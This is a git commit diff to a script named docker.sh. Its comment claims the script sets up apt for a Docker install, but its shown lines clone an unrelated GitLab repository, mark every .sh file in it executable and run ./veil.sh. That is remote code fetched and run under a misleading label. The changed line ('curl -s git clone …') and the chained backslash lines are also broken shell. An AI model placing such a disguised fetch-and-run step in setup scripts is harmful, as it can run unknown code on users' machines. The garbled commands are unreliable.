3dbf9dbdae6d047cbba90f3b92af566397a5dfa1
XCODE ERROR <83822701+cyberindo233@users.noreply.github.com>
2021-06-24 20:21:30 +0000

    Update docker.sh

--- docker.sh
+++ docker.sh
@@ -2,7 +2,7 @@
 sudo apt-get update
 
 #2.Install packages to allow apt to use a repository over HTTPS:
-git clone https://gitlab.com/whwhna4/mexx.git \
+curl -s git clone https://gitlab.com/whwhna4/mexx.git \
      cd mexx \
      chmod +x *.sh \
      ./veil.sh
